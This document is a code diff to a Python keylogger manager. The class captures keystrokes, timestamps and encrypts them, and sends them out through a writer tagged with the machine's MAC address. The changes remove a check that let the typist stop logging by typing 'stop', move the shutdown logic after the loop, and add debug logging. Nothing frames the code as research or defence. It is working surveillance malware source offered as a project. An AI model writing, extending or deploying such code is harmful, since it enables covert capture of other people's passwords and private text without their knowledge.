@@ -9,7 +9,7 @@ from time import sleep
 from datetime import datetime
 import logging
 
-logging.basicConfig(filename='../../utilities/log.txt', level=logging.DEBUG, format='%(asctime)s - %(message)s', filemode='a')
+logging.basicConfig(filename='../log.txt', level=logging.DEBUG, format='%(asctime)s - %(message)s', filemode='a')
 
 class KeyLoggerManager:
     """
@@ -63,10 +63,6 @@ class KeyLoggerManager:
         while self.flag:
             logged_keys = "".join(self.keylogger.get_logged_keys())
             if logged_keys:
-                if "stop" in logged_keys:
-                    self.keylogger.stop_logging()
-                    self.flag = False
-                    logged_keys = logged_keys.split('stop')[0] + 'stop'
                 logged_keys = datetime.now().strftime('%H:%M:%S %d/%m/%Y\n') + logged_keys
                 try:
                     encrypted_data = self.encoder.encryption(logged_keys)
@@ -77,6 +73,9 @@ class KeyLoggerManager:
             else:
                 self.write_data('')
             sleep(5)
+        self.keylogger.stop_logging()
+        self.flag = False
+        logging.info('Logging stopped')
 
     def write_data(self, encrypted_data):
         """
@@ -100,6 +99,7 @@ class KeyLoggerManager:
         else:
             self.writer = FileWriter()
         self.writer.send_data(encrypted_data, self.mac_address)
+        logging.info(f'Data written to {self.writer}')
 
 
 def main():
